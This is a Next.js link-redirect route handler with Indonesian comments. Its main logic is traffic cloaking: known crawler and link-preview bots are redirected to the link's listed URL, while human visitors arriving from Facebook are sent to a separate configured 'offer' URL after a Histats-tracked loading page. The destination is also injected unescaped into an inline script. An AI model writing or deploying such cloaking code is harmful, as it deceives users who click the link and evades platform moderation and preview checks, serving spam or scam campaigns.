import { NextResponse } from 'next/server';
import links from '@/data/links.json';
import offerConfig from '@/data/offer.json';
import appConfig from '@/data/config.json'; // Import config Histats

export async function GET(
  request: Request,
  { params }: { params: Promise<{ slug: string }> }
) {
  const { slug } = await params;
  const entry = (links as any[]).find((item) => item.id === slug);

  // 1. Jika link tidak ada, ke 404
  if (!entry) {
    const url = new URL(request.url);
    return NextResponse.redirect(new URL('/404', url.origin), { status: 302 });
  }

  // 2. TENTUKAN TUJUAN (Link Asli vs Offer)
  let finalDestination = entry.url;

  const urlObj = new URL(request.url);
  const searchParams = urlObj.searchParams;
  const referer = request.headers.get('referer') || "";
  const userAgent = request.headers.get('user-agent') || "";

  // Config Offer & Histats
  const OFFER_URL = offerConfig.url;
  const IS_OFFER_ACTIVE = offerConfig.active;
  const HISTATS_ID = appConfig.histatsId;
  const DELAY_MS = appConfig.delay;

  // Deteksi Kondisi
  const hasFbclid = searchParams.has('fbclid');
  const isFromFbReferer = referer.includes('facebook.com') || referer.includes('fb.com');
  const isBot = /facebookexternalhit|Facebot|Twitterbot|WhatsApp|TelegramBot|Discordbot|Googlebot|bingbot|baiduspider/i.test(userAgent);

  // Logic Belok ke Offer
  if (IS_OFFER_ACTIVE && (hasFbclid || isFromFbReferer) && !isBot) {
    finalDestination = OFFER_URL;
  }

  // KASUS A: BOT (Preview Link Aman) -> Server Redirect
  if (isBot) {
    return NextResponse.redirect(finalDestination, { status: 307 });
  }

  // KASUS B: MANUSIA -> Tampilkan Loading Polos + Histats
  // Kita inject ID Histats secara dinamis ke script di bawah
  const htmlContent = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Loading...</title>
      <style>
        body {
          background-color: #000;
          display: flex;
          align-items: center;
          justify-content: center;
          height: 100vh;
          margin: 0;
          overflow: hidden;
        }
        /* Loader Putih Simple */
        .loader {
          border: 3px solid rgba(255,255,255,0.1);
          border-top: 3px solid #fff;
          border-radius: 50%;
          width: 30px;
          height: 30px;
          animation: spin 0.8s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
      </style>
    </head>
    <body>
      <div class="loader"></div>

      <script type="text/javascript">
        var _Hasync= _Hasync|| [];
        _Hasync.push(['Histats.start', '1,${HISTATS_ID},4,0,0,0,00010000']);
        _Hasync.push(['Histats.fasi', '1']);
        _Hasync.push(['Histats.track_hits', '']);
        (function() {
          var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
          hs.src = ('//s10.histats.com/js15_as.js');
          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
        })();
      </script>
      <noscript>
        <a href="/" target="_blank">
          <img src="//sstatic1.histats.com/0.gif?${HISTATS_ID}&101" alt="" border="0">
        </a>
      </noscript>
      <script>
        setTimeout(function() {
          window.location.href = "${finalDestination}";
        }, ${DELAY_MS});
      </script>
    </body>
    </html>
  `;

  return new NextResponse(htmlContent, {
    headers: { 'Content-Type': 'text/html' },
  });
}
